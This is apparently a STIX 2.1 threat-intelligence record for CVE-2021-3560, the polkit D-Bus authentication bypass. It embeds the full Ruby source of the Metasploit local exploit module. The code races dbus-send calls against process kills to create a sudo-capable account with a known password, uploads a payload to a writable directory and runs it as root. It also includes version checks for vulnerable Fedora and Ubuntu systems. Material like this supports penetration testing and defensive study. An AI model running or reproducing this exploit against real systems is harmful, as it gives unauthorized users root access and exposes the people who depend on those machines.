{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ad52d4b2-1574-402a-848e-3cbeb8f5a9aa",
    "created": "2024-08-14T16:59:14.893274Z",
    "modified": "2024-08-14T16:59:14.893278Z",
    "name": "Polkit D-Bus Authentication Bypass",
    "description": " A vulnerability exists within the polkit system service that can be leveraged by a local, unprivileged attacker to perform privileged operations. In order to leverage the vulnerability, the attacker invokes a method over D-Bus and kills the client process. This will occasionally cause the operation to complete without being subjected to all of the necessary authentication. The exploit module leverages this to add a new user with a sudo access and a known password. The new account is then leveraged to execute a payload with root privileges.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/polkit_dbus_auth_bypass.rb",
            "external_id": "polkit_dbus_auth_bypass.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-3560"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'unix_crypt'\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Local::Linux\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Polkit D-Bus Authentication Bypass',\n        'Description' => %q{\n          A vulnerability exists within the polkit system service that can be leveraged by a local, unprivileged\n          attacker to perform privileged operations. In order to leverage the vulnerability, the attacker invokes a\n          method over D-Bus and kills the client process. This will occasionally cause the operation to complete without\n          being subjected to all of the necessary authentication.\n          The exploit module leverages this to add a new user with a sudo access and a known password. The new account\n          is then leveraged to execute a payload with root privileges.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Kevin Backhouse', # vulnerability discovery and analysis\n          'Spencer McIntyre',                  # metasploit module\n          'jheysel-r7'                         # metasploit module\n        ],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Platform' => ['unix', 'linux'],\n        'References' => [\n          ['URL', 'https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/'],\n          ['CVE', '2021-3560'],\n          ['EDB', '50011']\n        ],\n        'Targets' => [\n          [ 'Automatic', {} ],\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2021-06-03',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES, IOC_IN_LOGS, SCREEN_EFFECTS],\n          'Reliability' => [REPEATABLE_SESSION]\n        }\n      )\n    )\n    register_options([\n      OptString.new('USERNAME', [ true, 'A username to add as root', 'msf' ], regex: /^[a-z_]([a-z0-9_-]{0,31}|[a-z0-9_-]{0,30}\\$)$/),\n      OptString.new('PASSWORD', [ true, 'A password to add for the user (default: random)', rand_text_alphanumeric(8)]),\n      OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 30]),\n      OptInt.new('ITERATIONS', [ true, 'Due to the race condition the command might have to be run multiple times before it is successful. Use this to define how many times each command is attempted', 20])\n    ])\n    register_advanced_options([\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ])\n  end\n\n  def get_loop_sequence\n    datastore['ITERATIONS'].times.map(&:to_s).join(' ')\n  end\n\n  def exploit_set_realname(new_realname)\n    loop_sequence = get_loop_sequence\n    cmd_exec(<<~SCRIPT\n      for i in #{loop_sequence}; do\n        dbus-send\n          --system\n          --dest=org.freedesktop.Accounts\n          --type=method_call\n          --print-reply\n          /org/freedesktop/Accounts/User0\n          org.freedesktop.Accounts.User.SetRealName\n          string:'#{new_realname}' &\n        sleep #{@cmd_delay};\n        kill $!;\n        dbus-send\n          --system\n          --dest=org.freedesktop.Accounts\n          --print-reply\n          /org/freedesktop/Accounts/User0\n          org.freedesktop.DBus.Properties.Get\n          string:org.freedesktop.Accounts.User\n          string:RealName\n        | grep \"string \\\\\"#{new_realname}\\\\\"\";\n        if [ $? -eq 0 ]; then\n          echo success;\n          break;\n        fi;\n      done\n    SCRIPT\n               .gsub(/\\s+/, ' ')) =~ /success/\n  end\n\n  def get_cmd_delay\n    user = rand_text_alphanumeric(8)\n    time_command = \"bash -c 'time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:#{user} string:\\\"#{user}\\\" int32:1'\"\n    time = cmd_exec(time_command, nil, datastore['TIMEOUT']).match(/real\\s+\\d+m(\\d+.\\d+)s/)\n    unless time && time[1]\n      print_error(\"Unable to determine the time taken to run the dbus command, so the exploit cannot continue. Try increasing the TIMEOUT option. The command that failed was: #{time_command}\")\n      return nil\n    end\n\n    time_in_seconds = time[1].to_f\n    # The dbus-send command timeout is implementation-defined, typically 25 seconds\n    # https://dbus.freedesktop.org/doc/dbus-send.1.html#:~:text=25%20seconds\n    if time_in_seconds > datastore['TIMEOUT'].to_f || time_in_seconds > 25.00\n      print_error('The dbus-send command timed out which means the exploit cannot continue. This is likely due to the session service type being X11 instead of SSH. Please see the module documentation for more information.')\n      return nil\n    end\n    time_in_seconds / 2\n  end\n\n  def check\n    if datastore['TIMEOUT'] < 26\n      return CheckCode::Unknown(\"TIMEOUT is set to less than 26 seconds, so we can't detect if polkit times out or not.\")\n    end\n\n    unless cmd_exec('pkexec --version') =~ /pkexec version (\\d+\\S*)/\n      return CheckCode::Safe('The polkit framework is not installed.')\n    end\n\n    # The version as returned by pkexec --version is insufficient to identify whether or not the patch is installed. To\n    # do that, the distro specific package manager would need to be queried. See #check_via_version.\n    polkit_version = Rex::Version.new(Regexp.last_match(1))\n\n    unless cmd_exec('dbus-send -h') =~ /Usage: dbus-send/\n      return CheckCode::Detected('The dbus-send command is not accessible, however the polkit framework is installed.')\n    end\n\n    # Calculate the round trip time for the dbus command we want to kill half way through in order to trigger the exploit\n    @cmd_delay = get_cmd_delay\n    return CheckCode::Unknown('Failed to calculate the round trip time for the dbus command. This is necessary in order to exploit the target.') if @cmd_delay.nil?\n\n    status = nil\n    print_status('Checking for exploitability via attempt')\n    status ||= check_via_attempt\n    print_status('Checking for exploitability via version') unless status\n    status ||= check_via_version\n    status ||= CheckCode::Detected(\"Detected polkit framework version #{polkit_version}.\")\n\n    status\n  end\n\n  def check_via_attempt\n    status = nil\n    return status unless !is_root? && command_exists?('dbus-send')\n\n    # This is required to make the /org/freedesktop/Accounts/User0 object_path available.\n    dbus_method_call('/org/freedesktop/Accounts', 'org.freedesktop.Accounts.FindUserByName', 'root')\n    # Check for the presence of the vulnerability be exploiting it to set the root user's RealName property to a\n    # random string before restoring it.\n    result = dbus_method_call('/org/freedesktop/Accounts/User0', 'org.freedesktop.DBus.Properties.Get', 'org.freedesktop.Accounts.User', 'RealName')\n    if result =~ /variant\\s+string\\s+\"(.*)\"/\n      old_realname = Regexp.last_match(1)\n      if exploit_set_realname(rand_text_alphanumeric(12))\n        status = CheckCode::Vulnerable('The polkit framework instance is vulnerable.')\n        unless exploit_set_realname(old_realname)\n          print_error('Failed to restore the root user\\'s original \\'RealName\\' property value')\n        end\n      end\n    end\n\n    status\n  end\n\n  def check_via_version\n    sysinfo = get_sysinfo\n    case sysinfo[:distro]\n    when 'fedora'\n      if sysinfo[:version] =~ /Fedora( release)? (\\d+)/\n        distro_version = Regexp.last_match(2).to_i\n        if distro_version < 20\n          return CheckCode::Safe(\"Fedora version #{distro_version} is not affected (too old).\")\n        elsif distro_version < 33\n          return CheckCode::Appears(\"Fedora version #{distro_version} is affected.\")\n        elsif distro_version == 33\n          # see: https://bodhi.fedoraproject.org/updates/FEDORA-2021-3f8d6016c9\n          patched_version_string = '0.117-2.fc33.1'\n        elsif distro_version == 34\n          # see: https://bodhi.fedoraproject.org/updates/FEDORA-2021-0ec5a8a74b\n          patched_version_string = '0.117-3.fc34.1'\n        elsif distro_version > 34\n          return CheckCode::Safe(\"Fedora version #{distro_version} is not affected.\")\n        end\n\n        result = cmd_exec('dnf list installed \"polkit.*\"')\n        if result =~ /polkit\\.\\S+\\s+(\\d\\S+)\\s+/\n          current_version_string = Regexp.last_match(1)\n          if Rex::Version.new(current_version_string) < Rex::Version.new(patched_version_string)\n            return CheckCode::Appears(\"Version #{current_version_string} is affected.\")\n          else\n            return CheckCode::Safe(\"Version #{current_version_string} is not affected.\")\n          end\n        end\n      end\n    when 'ubuntu'\n      result = cmd_exec('apt-cache policy policykit-1')\n      if result =~ /\\s+Installed: (\\S+)$/\n        current_version_string = Regexp.last_match(1)\n        current_version = Rex::Version.new(current_version_string.gsub(/ubuntu/, '.'))\n\n        if current_version < Rex::Version.new('0.105-26')\n          # The vulnerability was introduced in 0.105-26\n          return CheckCode::Safe(\"Version #{current_version_string} is not affected (too old, the vulnerability was introduced in 0.105-26).\")\n        end\n\n        # See: https://ubuntu.com/security/notices/USN-4980-1\n        # The 'ubuntu' part of the string must be removed for Rex::Version compatibility, treat it as a point place.\n        case sysinfo[:version]\n        when /21\\.04/\n          patched_version_string = '0.105-30ubuntu0.1'\n        when /20\\.10/\n          patched_version_string = '0.105-29ubuntu0.1'\n        when /20\\.04/\n          patched_version_string = '0.105-26ubuntu1.1'\n        when /19\\.10/\n          return CheckCode::Appears('Ubuntu 19.10 is affected.')\n        end\n        # Ubuntu 19.04 and older are *not* affected\n\n        if current_version < Rex::Version.new(patched_version_string.gsub(/ubuntu/, '.'))\n          return CheckCode::Appears(\"Version #{current_version_string} is affected.\")\n        end\n\n        return CheckCode::Safe(\"Version #{current_version_string} is not affected.\")\n      end\n    end\n  end\n\n  def cmd_exec(*args)\n    result = super\n    result.gsub(/(\\e\\(B)?\\e\\[([;\\d]+)?m/, '') # remove ANSI escape sequences from the command output\n  end\n\n  def dbus_method_call(object_path, interface_member, *args)\n    cmd_args = %w[dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply]\n    cmd_args << object_path\n    cmd_args << interface_member\n    args.each do |arg|\n      if arg.is_a?(Integer)\n        cmd_args << \"int32:#{arg}\"\n      elsif arg.is_a?(String)\n        cmd_args << \"string:'#{arg}'\"\n      end\n    end\n\n    cmd = cmd_args.join(' ')\n    vprint_status(\"Running: #{cmd}\")\n    cmd_exec(cmd)\n  end\n\n  def create_unix_crypt_hash\n    UnixCrypt::SHA256.build(datastore['PASSWORD'].to_s)\n  end\n\n  def exploit_set_username(loop_sequence)\n    cmd_exec(<<~SCRIPT\n      for i in #{loop_sequence}; do\n        dbus-send\n          --system\n          --dest=org.freedesktop.Accounts\n          --type=method_call\n          --print-reply\n          /org/freedesktop/Accounts\n          org.freedesktop.Accounts.CreateUser\n          string:#{datastore['USERNAME']}\n          string:\\\"#{datastore['USERNAME']}\\\"\n          int32:1 &\n        sleep #{@cmd_delay}s;\n        kill $!;\n        if id #{datastore['USERNAME']}; then\n          echo \\\"success\\\";\n          break;\n        fi;\n      done\n    SCRIPT\n               .gsub(/\\s+/, ' ')) =~ /success/\n  end\n\n  def exploit_set_password(uid, hashed_password, loop_sequence)\n    cmd_exec(<<~SCRIPT\n      for i in #{loop_sequence}; do\n        dbus-send\n          --system\n          --dest=org.freedesktop.Accounts\n          --type=method_call\n          --print-reply\n          /org/freedesktop/Accounts/User#{uid}\n          org.freedesktop.Accounts.User.SetPassword\n          string:'#{hashed_password}'\n          string: &\n        sleep #{@cmd_delay}s;\n        kill $!;\n        echo #{datastore['PASSWORD']}\n        | su - #{datastore['USERNAME']}\n        -c \\\"echo #{datastore['PASSWORD']} | sudo -S id\\\"\n        | grep \\\"uid=0(root)\\\";\n        if [ $? -eq 0 ]; then\n          echo \\\"success\\\";\n          break;\n        fi;\n      done\n    SCRIPT\n               .gsub(/\\s+/, ' ')) =~ /success/\n  end\n\n  def exploit_delete_user(uid, loop_sequence)\n    cmd_exec(<<~SCRIPT\n      for i in #{loop_sequence}; do\n        dbus-send\n          --system\n          --dest=org.freedesktop.Accounts\n          --type=method_call\n          --print-reply\n          /org/freedesktop/Accounts\n          org.freedesktop.Accounts.DeleteUser\n          int64:#{uid}\n          boolean:true &\n        sleep #{@cmd_delay}s;\n        kill $!;\n        if id #{datastore['USERNAME']}; then\n          echo \\\"failed\\\";\n        else\n          echo \\\"success\\\";\n          break;\n        fi;\n      done\n    SCRIPT\n               .gsub(/\\s+/, ' ')) =~ /success/\n  end\n\n  def upload(path, data)\n    print_status(\"Writing '#{path}' (#{data.size} bytes) ...\")\n    rm_f(path)\n    write_file(path, data)\n    register_file_for_cleanup(path)\n  end\n\n  def upload_and_chmodx(path, data)\n    upload(path, data)\n    chmod(path)\n  end\n\n  def upload_payload\n    fname = \"#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha(5)}\"\n    upload_and_chmodx(fname, generate_payload_exe)\n    return nil unless file_exist?(fname)\n\n    fname\n  end\n\n  def execute_payload(fname)\n    cmd_exec(\"echo #{datastore['PASSWORD']} | su - #{datastore['USERNAME']} -c \\\"echo #{datastore['PASSWORD']} | sudo -Sb #{fname}\\\"\")\n  end\n\n  def exploit\n    fail_with(Failure::NotFound, 'Failed to find the su command which this exploit depends on.') unless command_exists?('su')\n    fail_with(Failure::NotFound, 'Failed to find the dbus-send command which this exploit depends on.') unless command_exists?('dbus-send')\n    if datastore['TIMEOUT'] < 26\n      fail_with(Failure::BadConfig, \"TIMEOUT is set to less than 26 seconds, so we can't detect if dbus-send times out or not.\")\n    end\n\n    if @cmd_delay.nil?\n      # cmd_delay wasn't set yet which is needed for the rest of the exploit to operate,\n      # likely cause the check method wasn't executed. Lets set it so long.\n\n      # Calculate the round trip time for the dbus command we want to kill half way through in order to trigger the exploit\n      @cmd_delay = get_cmd_delay\n      fail_with(Failure::Unknown, 'Failed to calculate the round trip time for the dbus command. This is necessary in order to exploit the target.') if @cmd_delay.nil?\n    end\n\n    print_status(\"Attempting to create user #{datastore['USERNAME']}\")\n    loop_sequence = get_loop_sequence\n\n    fail_with(Failure::BadConfig, \"The user #{datastore['USERNAME']} was unable to be created. Try increasing the ITERATIONS amount.\") unless exploit_set_username(loop_sequence)\n    uid = cmd_exec(\"id -u #{datastore['USERNAME']}\")\n    print_good(\"User #{datastore['USERNAME']} created with UID #{uid}\")\n    print_status(\"Attempting to set the password of the newly created user, #{datastore['USERNAME']}, to: #{datastore['PASSWORD']}\")\n    if exploit_set_password(uid, create_unix_crypt_hash, loop_sequence)\n      print_good('Obtained code execution as root!')\n      fname = upload_payload\n      execute_payload(fname)\n    else\n      print_error(\"Attempted to set the password #{datastore['Iterations']} times, did not work.\")\n    end\n\n    print_status('Attempting to remove the user added: ')\n    if exploit_delete_user(uid, loop_sequence)\n      print_good(\"Successfully removed #{datastore['USERNAME']}\")\n    else\n      print_warning(\"Unable to remove user: #{datastore['USERNAME']}, created during the running of this module\")\n    end\n  end\n\n  def on_new_session(client)\n    # Because we deleted the user directory, a meterp shell will be unusable until we chdir somewhere that exists\n    # So let's just use the WritableDir that must exist, given its use earlier\n    if !session.nil? && (client.type == 'meterpreter')\n      client.core.use('stdapi')\n      client.fs.dir.chdir(datastore['WritableDir'])\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-06-03",
    "x_mitre_platforms": [
        "['unix', 'linux']"
    ]
}